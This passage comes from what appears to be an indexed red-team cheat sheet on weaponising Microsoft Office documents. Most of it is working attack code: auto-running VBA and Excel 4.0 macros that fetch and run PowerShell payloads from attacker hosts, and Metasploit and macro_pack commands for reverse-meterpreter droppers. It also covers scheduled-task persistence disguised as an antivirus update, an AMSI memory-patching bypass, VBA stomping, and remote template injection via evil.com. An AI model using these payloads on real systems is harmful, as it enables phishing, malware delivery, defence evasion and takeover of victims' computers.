--platform windows -f raw -o msf86.bin\n\ndotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin\ndotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin\n\n# For VBA Macro\nMacrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop\n</code></pre> <p>When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p>"},{"location":"redteam/access/office-attacks/#xlm-excel-40-sharpshooter","title":"XLM Excel 4.0 - SharpShooter","text":"<ul> <li>https://github.com/mdsecactivebreach/SharpShooter</li> </ul> <pre><code># Options\n-rawscfile &lt;path&gt;  Path to raw shellcode file for stageless payloads\n--scfile &lt;path&gt;    Path to shellcode file as CSharp byte array\npython SharpShooter.py --payload slk --rawscfile shellcode.bin --output test\n\n# Creation of a VBA Macro\n# creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.\nSharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl\n\n# Creation of an Excel 4.0 SLK Macro Enabled Document\n~# /!\\ The shellcode cannot contain null bytes\nmsfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\\x00'\nSharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee\n\nmsfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\\x00'\nSharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee\n</code></pre>"},{"location":"redteam/access/office-attacks/#xlm-excel-40-excelntdonut","title":"XLM Excel 4.0 - EXCELntDonut","text":"<ul> <li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li> <li>AMSI has no visibility into XLM macros (for now)</li> <li>Anti-virus struggles with XLM (for now)</li> <li> <p>XLM macros can access the Win32 API (virtualalloc, createthread, ...)</p> </li> <li> <p>Open an Excel Workbook.</p> </li> <li>Right click on \"Sheet 1\" and click \"Insert...\". Select \"MS Excel 4.0 Macro\".</li> <li>Open your EXCELntDonut output file in a text editor and copy everything.</li> <li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li> <li>At this point, everything is in column A. To fix that, we'll use the \"Text-to-Columns\"/\"Convert\" tool under the \"Data\" tab.</li> <li>Highlight column A and open the \"Text-to-Columns\"  tool. Select \"Delimited\" and then \"Semicolon\" on the next screen. Select \"Finished\".</li> <li>Right-click on cell A1* and select \"Run\". This will execute your payload to make sure it works.</li> <li>To enable auto-execution, we need to rename cell A1 to \"Auto_Open\". You can do this by clicking into cell A1 and then clicking into the box that says \"A1\" just above Column A. Change the text from \"A1\"* to \"Auto_Open\". Save the file and verify that auto-execution works.</li> </ul> <p> If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1</p> <pre><code>git clone https://github.com/FortyNorthSecurity/EXCELntDonut\n\n-f path to file containing your C# source code (exe or dll)\n-c ClassName where method that you want to call lives (dll)\n-m Method containing your executable payload (dll)\n-r References needed to compile your C# code (ex: -r 'System.Management')\n-o output filename\n--sandbox Perform basic sandbox checks. \n--obfuscate Perform basic macro obfuscation. \n\n# Fork\ngit clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs\ndonut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe\ndonut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe\nusage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]\npython3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin\n</code></pre> <p>XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</p>"},{"location":"redteam/access/office-attacks/#xlm-excel-40-exec","title":"XLM Excel 4.0 - EXEC","text":"<ol> <li>Right Click to the current sheet</li> <li>Insert a Macro IntL MS Excel 4.0</li> <li>Add the <code>EXEC</code> macro     <pre><code>=EXEC(\"poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')\")\n=halt()\n</code></pre></li> <li>Rename cell to Auto_open</li> <li>Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide</li> </ol>"},{"location":"redteam/access/office-attacks/#slk-exec","title":"SLK - EXEC","text":"<pre><code>ID;P\nO;E\nNN;NAuto_open;ER101C1;KOut Flank;F\nC;X1;Y101;K0;EEXEC(\"c:\\shell.cmd\")\nC;X1;Y102;K0;EHALT()\nE\n</code></pre>"},{"location":"redteam/access/office-attacks/#word","title":"Word","text":""},{"location":"redteam/access/office-attacks/#docm-metasploit","title":"DOCM - Metasploit","text":"<pre><code>use exploit/multi/fileformat/office_word_macro\nset payload windows/meterpreter/reverse_http\nset LHOST 10.10.10.10\nset LPORT 80\nset DisablePayloadHandler True\nset PrependMigrate True\nset FILENAME Financial2021.docm\nexploit -j\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-download-and-execute","title":"DOCM - Download and Execute","text":"<p>Detected by Defender (AMSI)</p> <pre><code>Sub Execute()\nDim payload\npayload = \"powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');\"\nCall Shell(payload, vbHide)\nEnd Sub\nSub Document_Open()\nExecute\nEnd Sub\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-macro-creator","title":"DOCM - Macro Creator","text":"<ul> <li>https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</li> </ul> <pre><code># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:\nC:\\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body\n# Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:\nC:\\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o\n# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:\nC:\\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-c-converted-to-office-vba-macro","title":"DOCM - C# converted to Office VBA macro","text":"<p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p> <p>https://github.com/trustedsec/unicorn</p> <pre><code>python unicorn.py payload.cs cs macro\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-vba-wscript","title":"DOCM - VBA Wscript","text":"<p>https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</p> <pre><code>Sub parent_change()\n    Dim objOL\n    Set objOL = CreateObject(\"Outlook.Application\")\n    Set shellObj = objOL.CreateObject(\"Wscript.Shell\")\n    shellObj.Run(\"notepad.exe\")\nEnd Sub\nSub AutoOpen()\n    parent_change\nEnd Sub\nSub Auto_Open()\n    parent_change\nEnd Sub\n</code></pre> <pre><code>CreateObject(\"WScript.Shell\").Run \"calc.exe\"\nCreateObject(\"WScript.Shell\").Exec \"notepad.exe\"\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-vba-shell-execute-comment","title":"DOCM - VBA Shell Execute Comment","text":"<p>Set your command payload inside the Comment metadata of the document.</p> <pre><code>Sub beautifulcomment()\n    Dim p As DocumentProperty\n    For Each p In ActiveDocument.BuiltInDocumentProperties\n        If p.Name = \"Comments\" Then\n            Shell (p.Value)\n        End If\n    Next\nEnd Sub\n\nSub AutoExec()\n    beautifulcomment\nEnd Sub\n\nSub AutoOpen()\n    beautifulcomment\nEnd Sub\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-vba-spawning-via-svchostexe-using-scheduled-task","title":"DOCM - VBA Spawning via svchost.exe using Scheduled Task","text":"<pre><code>Sub AutoOpen()\n    Set service = CreateObject(\"Schedule.Service\")\n    Call service.Connect\n    Dim td: Set td = service.NewTask(0)\n    td.RegistrationInfo.Author = \"Kaspersky Corporation\"\n    td.settings.StartWhenAvailable = True\n    td.settings.Hidden = False\n    Dim triggers: Set triggers = td.triggers\n    Dim trigger: Set trigger = triggers.Create(1)\n    Dim startTime: ts = DateAdd(\"s\", 30, Now)\n    startTime = Year(ts) &amp; \"-\" &amp; Right(Month(ts), 2) &amp; \"-\" &amp; Right(Day(ts), 2) &amp; \"T\" &amp; Right(Hour(ts), 2) &amp; \":\" &amp; Right(Minute(ts), 2) &amp; \":\" &amp; Right(Second(ts), 2)\n    trigger.StartBoundary = startTime\n    trigger.ID = \"TimeTriggerId\"\n    Dim Action: Set Action = td.Actions.Create(0)\n    Action.Path = \"C:\\Windows\\System32\\powershell.exe\"\n    Action.Arguments = \"-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"\n    Call service.GetFolder(\"\\\").RegisterTaskDefinition(\"AVUpdateTask\", td, 6, , , 3)\nEnd Sub\nRem powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-wmi-com-functions","title":"DOCM - WMI COM functions","text":"<p>Basic WMI exec (detected by Defender) : <code>r = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").Create(\"calc.exe\", null, null, intProcessID)</code></p> <pre><code>Sub wmi_exec()\n    strComputer = \".\"\n    Set objWMIService = GetObject(\"winmgmts:\\\\\" &amp; strComputer &amp; \"\\root\\cimv2\")\n    Set objStartUp = objWMIService.Get(\"Win32_ProcessStartup\")\n    Set objProc = objWMIService.Get(\"Win32_Process\")\n    Set procStartConfig = objStartUp.SpawnInstance_\n    procStartConfig.ShowWindow = 1\n    objProc.Create \"powershell.exe\", Null, procStartConfig, intProcessID\nEnd Sub\n</code></pre> <ul> <li>https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</li> <li>https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</li> </ul> <pre><code>Sub ASR_bypass_create_child_process_rule5()\n    Const HIDDEN_WINDOW = 0\n    strComputer = \".\"\n    Set objWMIService = GetObject(\"win\" &amp; \"mgmts\" &amp; \":\\\\\" &amp; strComputer &amp; \"\\root\" &amp; \"\\cimv2\")\n    Set objStartup = objWMIService.Get(\"Win32_\" &amp; \"Process\" &amp; \"Startup\")\n    Set objConfig = objStartup.SpawnInstance_\n    objConfig.ShowWindow = HIDDEN_WINDOW\n    Set objProcess = GetObject(\"winmgmts:\\\\\" &amp; strComputer &amp; \"\\root\" &amp; \"\\cimv2\" &amp; \":Win32_\" &amp; \"Process\")\n    objProcess.Create \"cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')\", Null, objConfig, intProcessID\nEnd Sub\n\nSub AutoExec()\n    ASR_bypass_create_child_process_rule5\nEnd Sub\n\nSub AutoOpen()\n    ASR_bypass_create_child_process_rule5\nEnd Sub\n</code></pre> <pre><code>Const ShellWindows = \"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\"\nSet SW = GetObject(\"new:\" &amp; ShellWindows).Item()\nSW.Document.Application.ShellExecute \"cmd.exe\", \"/c powershell.exe\", \"C:\\Windows\\System32\", Null, 0\n</code></pre>"},{"location":"redteam/access/office-attacks/#docmxlm-macro-pack-macro-and-dde","title":"DOCM/XLM - Macro Pack - Macro and DDE","text":"<p>Only the community version is available online.</p> <ul> <li>https://github.com/sevagas/macro_pack</li> </ul> <pre><code># Options\n-G, --generate=OUTPUT_FILE_PATH. Generates a file. \n-t, --template=TEMPLATE_NAME    Use code template already included in MacroPack\n-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)\n\n# Execute a command\necho \"calc.exe\" | macro_pack.exe -t CMD -G cmd.xsl\n\n# Download and execute a file\necho &lt;file_to_drop_url&gt; \"&lt;download_path&gt;\" | macro_pack.exe -t DROPPER -o -G dropper.xls\n\n# Meterpreter reverse TCP template using MacroMeter by Cn33liz\necho &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm\n\n# Drop and execute embedded file\nmacro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs\n\n# Obfuscate the vba file generated by msfvenom and put result in a new vba file.\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba\n\n# Obfuscate Empire stager vba file and generate a MS Word document:\nmacro_pack.exe -f empire.vba -o -G myDoc.docm\n\n# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)\necho \"https://myurl.url/payload.exe\" \"dropped.exe\" |  macro_pack.exe -o -t DROPPER -G \"drop.xlsm\" \n\n# Execute calc.exe via Dynamic Data Exchange (DDE) attack\necho calc.exe | macro_pack.exe --dde -G calc.xslx\n\n# Download and execute file via powershell using Dynamic Data Exchange (DDE) attack\nmacro_pack.exe --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl\n\n# PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).\nmsfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm\n\n# PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.\nmsfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm\n\n# PRO: Generate an HTA payload able to run a shellcode via Excel injection\necho meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples\\nicepic.hta\necho meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\\my_shortcut.lnk\n\n# PRO: XLM Injection\necho \"MPPro\" | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm --run-in-excel\n\n# PRO: ShellCode Exec - Heap Injection, AlternativeInjection\necho \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc\necho \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc\n\n# PRO: More shellcodes\necho x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm \u2013keep-alive\necho \"x86.bin\" \"x64.bin\" | macro_pack.exe -t AUTOSHELLCODE -o \u2013autopack -G sc_auto.doc\necho \"http://192.168.5.10:8080/x32calc.bin\" \"http://192.168.5.10:8080/x64calc.bin\" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\\sc_dl.xls\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-badassmacros","title":"DOCM - BadAssMacros","text":"<p>C# based automated Malicous Macro Generator.</p> <ul> <li>https://github.com/Inf0secRabbit/BadAssMacros</li> </ul> <pre><code>BadAssMacros.exe -h\n\n# Create VBA for classic shellcode injection from raw shellcode\nBadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s classic -c &lt;caesar_shift_value&gt; -o &lt;path_to_output_file&gt;\nBadAssMacros.exe -i .\\Desktop\\payload.bin -w doc -p no -s classic -c 23 -o .\\Desktop\\output.txt\n\n# Create VBA for indirect shellcode injection from raw shellcode\nBadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s indirect -o &lt;path_to_output_file&gt;\n\n# List modules inside Doc/Excel file\nBadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -l\n\n# Purge Doc/Excel file\nBadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -o &lt;path_to_output_file&gt; -m &lt;module_name&gt;\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-cactustorch-vba-module","title":"DOCM - CACTUSTORCH VBA Module","text":"<p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p> <ul> <li>https://github.com/mdsecactivebreach/CACTUSTORCH</li> <li>https://github.com/tyranid/DotNetToJScript/</li> <li>CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY</li> <li> <p>CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ</p> </li> <li> <p>Import .cna in Cobalt Strike</p> </li> <li>Generate a new VBA payload from the CACTUSTORCH menu</li> <li>Download DotNetToJscript</li> <li>Compile it <ul> <li>DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li> <li>ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text \"test\"</li> </ul> </li> <li>Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type     <pre><code>DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch\n</code></pre></li> <li>Use the generated code to replace the hardcoded binary in CactusTorch</li> </ul>"},{"location":"redteam/access/office-attacks/#docm-mmg-with-custom-dl-exec","title":"DOCM - MMG with Custom DL + Exec","text":"<ol> <li>Custom Download in first Macro to \"C:\\Users\\Public\\beacon.exe\"</li> <li>Create a custom binary execute using MMG</li> <li>Merge both Macro</li> </ol> <pre><code>git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator\npython MMG.py configs/generic-cmd.json malicious.vba\n{\n    \"description\": \"Generic command exec payload\\nEvasion technique set to none\",\n    \"template\": \"templates/payloads/generic-cmd-template.vba\",\n    \"varcount\": 152,\n    \"encodingoffset\": 5,\n    \"chunksize\": 180,\n    \"encodedvars\":  {},\n    \"vars\":     [],\n    \"evasion\":  [\"encoder\"],\n    \"payload\": \"cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe\"\n}\n</code></pre> <pre><code>Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long\n\nPublic Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean\n    On Error GoTo Failed\n    DownloadFileA = False\n    'As directory must exist, this is a check\n    If CreateObject(\"Scripting.FileSystemObject\").FolderExists(CreateObject(\"Scripting.FileSystemObject\").GetParentFolderName(DownloadPath)) = False Then Exit Function\n    Dim returnValue As Long\n    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)\n    'If return value is 0 and the file exist, then it is considered as downloaded correctly\n    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0)\n    Exit Function\n\nFailed:\nEnd Function\n\nSub AutoOpen()\n    DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\"\nEnd Sub\n\n\nSub Auto_Open()\n    DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\"\nEnd Sub\n</code></pre>"},{"location":"redteam/access/office-attacks/#docm-activex-based-inkpicture-control-painted-event-autorun-macro","title":"DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro","text":"<p>Go to Developer tab on ribbon <code>-&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control</code> </p> <pre><code>Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)\nRun = Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://&lt;host&gt;/file.exe','file.exe');Start-Process 'file.exe'\", vbNormalFocus)\nEnd Sub\n</code></pre>"},{"location":"redteam/access/office-attacks/#vba-obfuscation","title":"VBA Obfuscation","text":"<pre><code># https://www.youtube.com/watch?v=L0DlPOLx2k0\n$ git clone https://github.com/bonnetn/vba-obfuscator\n$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin\n</code></pre>"},{"location":"redteam/access/office-attacks/#vba-purging","title":"VBA Purging","text":"<p>VBA Stomping: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. </p> <p> VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p>"},{"location":"redteam/access/office-attacks/#officepurge","title":"OfficePurge","text":"<ul> <li>https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</li> </ul> <pre><code>OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros\nOfficePurge.exe -d excel -f .\\payroll.xls -m Module1\nOfficePurge.exe -d publisher -f .\\donuts.pub -m ThisDocument\nOfficePurge.exe -d word -f .\\malicious.doc -l\n</code></pre>"},{"location":"redteam/access/office-attacks/#evilclippy","title":"EvilClippy","text":"<p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files.  Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p> <pre><code># OSX/Linux\nmcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs \n# Windows\ncsc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs \n\nEvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc\nEvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc\nEvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc\n\n# make macro code unaccessible is to mark the project as locked and unviewable: -u\n# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.\nEvilClippy.exe -r macrofile.doc\n</code></pre>"},{"location":"redteam/access/office-attacks/#vba-offensive-security-template","title":"VBA - Offensive Security Template","text":"<ul> <li>Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</li> <li>Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process</li> <li>RunPE - https://github.com/itm4n/VBA-RunPE</li> <li>Spoof Parent - https://github.com/py7hagoras/OfficeMacro64</li> <li>AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</li> <li>amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</li> <li>VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</li> </ul>"},{"location":"redteam/access/office-attacks/#vba-amsi","title":"VBA - AMSI","text":"<p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</p> <p></p> <p> It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p> <p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p> <ul> <li>AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass</li> </ul> <pre><code>Private Declare PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\nPrivate Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr\nPrivate Declare PtrSafe Function VirtualProtect Lib \"kernel32\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long\nPrivate Declare PtrSafe Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" (Destination As Any, Source As Any, ByVal Length As LongPtr)\n\nPrivate Sub Document_Open()\n    Dim AmsiDLL As LongPtr\n    Dim AmsiScanBufferAddr As LongPtr\n    Dim result As Long\n    Dim MyByteArray(6) As Byte\n    Dim ArrayPointer As LongPtr\n\n    MyByteArray(0) = 184 ' 0xB8\n    MyByteArray(1) = 87  ' 0x57\n    MyByteArray(2) = 0   ' 0x00\n    MyByteArray(3) = 7   ' 0x07\n    MyByteArray(4) = 128 ' 0x80\n    MyByteArray(5) = 195 ' 0xC3\n\n    AmsiDLL = LoadLibrary(\"amsi.dll\")\n    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, \"AmsiScanBuffer\")\n    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)\n    ArrayPointer = VarPtr(MyByteArray(0))\n    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6\n\nEnd Sub\n</code></pre>"},{"location":"redteam/access/office-attacks/#docx-template-injection","title":"DOCX - Template Injection","text":"<p> Does not require \"Enable Macro\"</p>"},{"location":"redteam/access/office-attacks/#remote-template","title":"Remote Template","text":"<ol> <li>A malicious macro is saved in a Word template .dotm file</li> <li>Benign .docx file is created based on one of the default MS Word Document templates</li> <li>Document from step 2 is saved as .docx</li> <li>Document from step 3 is renamed to .zip</li> <li>Document from step 4 gets unzipped</li> <li>.\\word_rels\\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).     <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"&gt;&lt;Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx\" TargetMode=\"External\"/&gt;&lt;/Relationships&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"&gt;&lt;Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\nTarget=\"https://evil.com/malicious.dotm\" TargetMode=\"External\"/&gt;&lt;/Relationships&gt;\n</code></pre></li> <li>File gets zipped back up again and renamed to .docx</li> </ol>"},{"location":"redteam/access/office-attacks/#template-injections-tools","title":"Template Injections Tools","text":"<ul> <li>https://github.com/JohnWoodman/remoteInjector</li> <li>https://github.com/ryhanson/phishery</li> </ul> <pre><code>$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx\n[+] Opening Word document: good.docx\n[+] Setting Word document template to: https://secure.site.local/docs\n[+] Saving injected Word document to: bad.docx\n[*] Injected Word document has been saved!\n</code></pre>"},{"location":"redteam/access/office-attacks/#docx-dde","title":"DOCX - DDE","text":"<ul> <li>Insert &gt; QuickPart &gt; Field</li> <li>Right Click &gt; Toggle Field Code</li> <li><code>{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" }</code></li> </ul>"},{"location":"redteam/access/office-attacks/#references","title":"References","text":"<ul> <li>VBA RunPE Part 1 - itm4n</li> <li>VBA RunPE Part 2 - itm4n</li> <li>Office VBA AMSI Parting the veil on malicious macros - Microsoft</li> <li>Bypassing AMSI fro VBA - Outflank</li> <li>Evil Clippy MS Office Maldoc Assistant - Outflank</li> <li>Old schoold evil execl 4.0 macros XLM - Outflank</li> <li>Excel 4 Macro Generator x86/x64 - bytecod3r</li> <li>VBad - Pepitoh</li> <li>Excel 4.0 Macro Function Reference PDF</li> <li>Excel 4.0 Macros so hot right now - SneekyMonkey</li> <li>Macros and more with sharpshooter v2.0 - mdsec</li> <li>Further evasion in the forgotten corners of ms xls - malware.pizza</li> <li>Excel 4.0 macro old but new - fsx30</li> <li>XLS 4.0 macros and covenant - d-sec</li> <li>Inject macro from a remote dotm template - ired.team</li> <li>Phishinh with OLE - ired.team</li> <li>Phishing SLK - ired.teambypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li> <li>PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</li> <li>AMSI in the heap - rmdavy</li> <li>WordAMSIBypass - rmdavy</li> <li>Dechaining macros and evading EDR - Noora Hyv\u00e4rinen</li> <li>Executing macros from docx 